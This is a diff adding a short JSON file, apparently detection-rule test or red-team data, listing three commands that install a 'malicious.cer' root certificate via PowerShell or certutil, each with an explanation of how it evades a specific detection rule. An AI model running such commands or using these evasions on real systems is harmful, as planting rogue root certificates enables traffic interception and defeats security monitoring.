@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -c \"Import-Certificate -f C:\\Windows\\TEMP\\malicious.cer -CertStoreLocation Cert:\\LocalMachine\\Root\"",
+    "explanation": "Bypasses the rule by using the abbreviated '-f' parameter instead of the expected ' -FilePath ' string, which breaks the 'contains|all' detection logic."
+  },
+  {
+    "output": "powershell.exe -c \"Import-Certificate -FilePath C:\\ProgramData\\malicious.cer -CertStoreLocation Cert:\\LocalMachine\\Root\"",
+    "explanation": "Bypasses the rule by storing and loading the certificate from 'C:\\ProgramData\\', a directory that is not included in the rule's hardcoded list of suspicious locations."
+  },
+  {
+    "output": "certutil.exe -addstore Root C:\\Windows\\TEMP\\malicious.cer",
+    "explanation": "Bypasses the rule entirely by using the native Windows 'certutil.exe' utility to install the root certificate instead of the PowerShell 'Import-Certificate' cmdlet, avoiding the targeted strings completely."
+  }
+]
